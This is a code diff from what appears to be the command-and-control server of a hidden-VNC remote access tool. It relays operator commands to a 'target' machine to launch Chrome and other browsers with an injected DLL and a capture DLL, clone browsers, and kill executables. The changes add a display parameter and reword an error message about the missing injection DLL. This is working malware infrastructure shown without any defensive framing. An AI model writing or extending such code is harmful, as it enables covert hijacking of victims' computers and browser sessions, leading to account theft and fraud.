@@ -1098,6 +1098,7 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
         path: String(payload.path || ""),
         kill_exe: String(payload.kill_exe || ""),
         opera_patch: Boolean(payload.opera_patch),
+        display: state.display ?? 0,
       });
       break;
     case "hvnc_kill_all":
@@ -1107,7 +1108,7 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
       const dllData = getInjectionDllBytes();
       if (!dllData) {
         logger.warn("[hvnc] injection DLL not available, cannot send hvnc_start_process_injected");
-        safeSendViewer(ws, { type: "hvnc_error", error: "Injection DLL not found on server" });
+        safeSendViewer(ws, { type: "hvnc_error", error: "HVNC injection DLL not found on the server. Browser cloning requires the DLL to be built and placed in the server directory.", critical: true });
         break;
       }
       const captureDll = getCaptureDllBytes();
@@ -1116,6 +1117,7 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
         search_path: String(payload.search_path || ""),
         replace_path: String(payload.replace_path || ""),
         dll: dllData,
+        display: state.display ?? 0,
       };
       if (captureDll) cmdPayload.capture_dll = captureDll;
       sendHVNCCommand(target, "hvnc_start_process_injected", cmdPayload);
@@ -1125,13 +1127,14 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
       const dllData = getInjectionDllBytes();
       if (!dllData) {
         logger.warn("[hvnc] injection DLL not available, cannot send hvnc_start_chrome_injected");
-        safeSendViewer(ws, { type: "hvnc_error", error: "Injection DLL not found on server" });
+        safeSendViewer(ws, { type: "hvnc_error", error: "HVNC injection DLL not found on the server. Browser cloning requires the DLL to be built and placed in the server directory.", critical: true });
         break;
       }
       const captureDllChrome = getCaptureDllBytes();
       const chromeCmdPayload: Record<string, any> = {
         path: String(payload.path || ""),
         dll: dllData,
+        display: state.display ?? 0,
       };
       if (captureDllChrome) chromeCmdPayload.capture_dll = captureDllChrome;
       sendHVNCCommand(target, "hvnc_start_chrome_injected", chromeCmdPayload);
@@ -1141,7 +1144,7 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
       const dllData = getInjectionDllBytes();
       if (!dllData) {
         logger.warn("[hvnc] injection DLL not available, cannot send hvnc_start_browser_injected");
-        safeSendViewer(ws, { type: "hvnc_error", error: "Injection DLL not found on server" });
+        safeSendViewer(ws, { type: "hvnc_error", error: "HVNC injection DLL not found on the server. Browser cloning requires the DLL to be built and placed in the server directory.", critical: true });
         break;
       }
       const captureDllBrowser = getCaptureDllBytes();
@@ -1152,6 +1155,7 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
         cloneLite: payload.cloneLite === true,
         killIfRunning: payload.killIfRunning === true,
         dll: dllData,
+        display: state.display ?? 0,
       };
       if (captureDllBrowser) browserCmdPayload.capture_dll = captureDllBrowser;
       sendHVNCCommand(target, "hvnc_start_browser_injected", browserCmdPayload);
